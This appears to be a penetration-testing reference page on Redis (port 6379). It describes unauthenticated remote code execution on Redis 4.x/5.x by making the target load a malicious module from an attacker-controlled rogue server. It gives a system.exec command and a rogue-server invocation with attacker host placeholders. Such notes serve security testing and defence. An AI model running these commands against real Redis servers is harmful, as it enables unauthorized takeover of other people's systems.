---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# 6379 - Redis

Redis is an open-source, in-memory key-value data store used for high-performance caching, message brokering, and real-time analytics. It supports a variety of data structures like strings, hashes, lists, sets, and sorted sets, and operates entirely in memory for speed, with optional persistence to disk. By default, Redis listens on TCP port `6379` and **has no authentication or encryption unless explicitly configured**, which often makes it a target during red team operations.

## Unauthenticated Root RCE

Redis `4.x` and `5.x` instances are vulnerable to **unauthenticated RCE** by abusing the `MODULE LOAD` feature to load a malicious `.so` file. The attack works by tricking the target Redis server into connecting to an attacker-controlled rogue Redis instance, which delivers a crafted shared object module.

The `.so` file is a compiled Redis module written in C, designed to extend Redis with new functionality. In this case, the module adds a backdoor command—such as `system.exec`—that enables direct shell command execution on the host. This functionality is normally intended for legitimate extensions but becomes dangerous when Redis is exposed or misconfigured.

The attacker compiles the malicious module (e.g., using the `RedisModules-ExecuteCommand` project) and hosts it via the rogue server. The target Redis instance is then instructed to connect back and load the module. Once loaded, commands like the following can be used:

```bash
redis-cli -h <target> -p <port> system.exec "id"
```

This leads to RCE under the privileges of the Redis process. A working [PoC](https://github.com/K0rz3n/redis-rogue-server-1) is publicly available.

{% code overflow="wrap" %}
```bash
python3 redis-rogue-server.py --rhost <target-IP> --rport <target-port> --lhost <attacking-IP> --lport <attacking-port>
```
{% endcode %}
